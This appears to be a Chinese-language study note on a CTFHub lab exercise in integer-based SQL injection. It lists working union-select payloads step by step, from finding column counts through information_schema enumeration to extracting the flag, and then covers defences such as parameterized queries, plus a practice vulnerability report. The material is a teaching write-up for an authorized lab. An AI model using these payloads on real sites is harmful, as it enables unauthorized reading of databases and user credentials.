# 03 · SQL 注入入门

> 日期：2026-09-14 | 标签：#Web安全 #SQL注入

## 1. 什么是 SQL 注入

网站把用户的输入直接拼接在 SQL 语句后面，导致用户输入的"数据"被当成 SQL 代码执行，从而读取到不该看到的数据。

根本原因：**数据和代码没有分离**。

## 2. 环境与工具

- **CTFHub**：授权靶场（题目来源：技能树 → Web → SQL 注入 → 整数型注入）
- **Burp Suite**：抓包、改包
- 浏览器

## 3. 核心名词

| 名词 | 含义 |
|---|---|
| 注入点 | 用户输入被拼进 SQL 的位置 |
| payload | 攻击用的输入，如 `-1 union select 1,2` |
| 列数 | 原查询返回几列（决定 union 写几个值） |
| 回显位 | 查询结果会显示在页面的哪个位置 |
| union select | 把自己的查询接到原查询后面 |
| `information_schema` | MySQL 自带的数据库"总目录" |
| `database()` | 返回当前数据库名 |
| `group_concat()` | 把多行结果拼成一行 |
| `flag` | 靶场预设的目标字符串 |
| `table_schema` | 表所属的数据库 |
| `table_name` | 表名 |
| `column_name` | 字段名 |

## 4. 操作步骤：CTFHub 整数型注入

| 步骤 | 输入 | 结果 |
|---|---|---|
| ① 找注入点 | `1` | 页面回显 `select * from news where id=1` |
| ② 判断列数 | `1 order by 2` / `1 order by 3` | 2 正常、3 报错 → 2 列 |
| ③ 找回显位 | `-1 union select 1,2` | ID=1、Data=2 |
| ④ 查库名 | `-1 union select 1,database()` | sqli |
| ⑤ 查表名 | `-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()` | news,flag |
| ⑥ 查字段名 | `-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'` | flag |
| ⑦ 取数据 | `-1 union select 1,flag from flag` | 拿到 flag ✅ |

## 5. information_schema 速查

| 想知道什么 | 查哪张目录表 | 看哪一列 |
|---|---|---|
| 有哪些库 | `schemata` | `schema_name` |
| 有哪些表 | `tables` | `table_name` |
| 表里有哪些字段 | `columns` | `column_name` |
| 字段类型 | `columns` | `data_type` |

说明：这些目录表由 MySQL 自动维护，记录所有库、表、字段的元信息。

## 6.schema_name与 table_schema的区别
-- ① 想知道有哪些数据库（列出所有库名）
select schema_name from information_schema.schemata

-- ② 想知道某个库里有哪些表（先靠 table_schema 筛选库）
select table_name from information_schema.tables 
where table_schema = 'sqli'

## 7. 我的理解

1. `order by` 前面要带上合法的 id 值，否则 `id=order by 2` 会报错
2. 用 `union select` 时前面写 `-1`，是为了让原查询查不到数据，我们自己的结果才能显示出来
3. 最后一步的两个 `flag`：一个在 `from` 后面（表名），一个在 `select` 和 `from` 之间（字段名）
4. `information_schema` 是 MySQL 自动维护的"总目录"，记录了所有库、表、字段的名字，不知道表名/字段名时就靠它查出来

## 8. 踩坑记录

- 一开始只写 `order by 2` 会报错，因为输入会被拼到 `id=` 后面，必须带上合法值：`1 order by 2`
- 单行数据看不出排序变化，判断列数要看**报不报错**，不是看内容变没变

## 9. 防御方法

### 根本方法：参数化查询（预编译）

原理：把 SQL 语句和用户输入分开，用户输入永远只被当成"数据"，不会被当成代码执行。

危险写法（字符串拼接）：

```python
sql = "select * from news where id=" + 用户输入
cursor.execute(sql)
```

安全写法（参数化）：

```python
cursor.execute("select * from news where id=%s", (用户输入,))
```

### 辅助手段

- 输入校验：比如 id 只允许数字
- 最小权限：数据库账号只给必要权限，不能删库、读文件
- 错误信息不外泄：不把 SQL 报错直接显示给用户
- WAF：拦截常见注入特征（可能被绕过，不能只靠它）

## 10. 漏洞报告示例（练习写报告）

| 项目 | 内容 |
|---|---|
| 漏洞名称 | SQL 注入（整数型） |
| 风险等级 | 高危 |
| 漏洞位置 | CTFHub 靶场，id 参数 |
| 复现步骤 | 1. 输入 `1`，页面回显 SQL 语句；2. 用 `order by` 判断出 2 列；3. 用 `union select` 逐步查出库名、表名、字段名；4. 读取 flag |
| 危害说明 | 攻击者可读取数据库中任意数据；真实场景下可能导致用户账号密码泄露 |
| 修复建议 | 使用参数化查询；限制数据库账号权限；不向前端泄露 SQL 错误信息 |

## 11. 合规提醒

所有实验仅在本人环境或授权靶场（CTFHub）中完成。未经授权对真实网站进行测试属于违法行为。

## 12. 参考资料

- PortSwigger Web Security Academy：https://portswigger.net/web-security
